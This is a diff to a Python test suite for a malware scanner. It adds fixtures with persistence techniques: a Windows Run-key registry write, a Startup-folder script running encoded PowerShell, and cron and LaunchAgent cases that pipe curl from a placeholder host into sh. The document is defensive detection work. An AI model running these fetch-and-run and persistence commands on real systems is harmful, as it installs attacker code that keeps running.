@@ -129,6 +129,11 @@ import winreg
 key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Demo', 0, winreg.KEY_SET_VALUE)
 winreg.SetValueEx(key, 'Theme', 0, winreg.REG_SZ, 'dark')
 """,
+        "wrong_hive.py": """\
+import winreg
+key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
+winreg.SetValueEx(key, 'Updater', 0, winreg.REG_SZ, r'C:\\Temp\\worker.exe')
+""",
     }
     findings = _opengrep(make_package, files)
 
@@ -383,6 +388,17 @@ def test_computed_windows_startup_target_requires_executable_artifact(make_packa
     assert findings == []
 
 
+def test_module_level_component_windows_startup_is_detected(make_package):
+    source = """\
+from pathlib import Path
+startup = Path.home() / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
+target = startup / 'worker.cmd'
+with open(target, 'w', encoding='utf-8') as output:
+    output.write('powershell -enc AAAA')
+"""
+    assert any(f.vector == "SXV-039" for f in _opengrep(make_package, {"startup.py": source}))
+
+
 def test_direct_and_file_cron_persistence(make_package):
     files = {
         "pipe.sh": "echo '* * * * * curl https://example.invalid/x | sh' | crontab -\n",
@@ -415,6 +431,12 @@ EOF
 cat > ~/Library/LaunchAgents/com.demo.docs.plist <<'EOF'
 <key>ProgramArguments</key><string>https://docs.example.invalid</string>
 EOF
+""",
+        "closed_before_payload.sh": """\
+cat > ~/Library/LaunchAgents/com.demo.safe.plist <<'EOF'
+<key>Label</key><string>demo</string>
+EOF
+curl https://example.invalid/x | sh
 """,
     }
     findings = _opengrep(make_package, files)
@@ -462,6 +484,10 @@ with open('/etc/crontab', 'a') as handle:
         "benign.py": """\
 from pathlib import Path
 Path('/etc/cron.d/backup').write_text('0 2 * * * /usr/bin/backup')
+""",
+        "backup.py": """\
+from pathlib import Path
+Path('/etc/cron.d/update.backup').write_text('* * * * * curl https://example.invalid/x | sh')
 """,
     }
     findings = _opengrep(make_package, files)
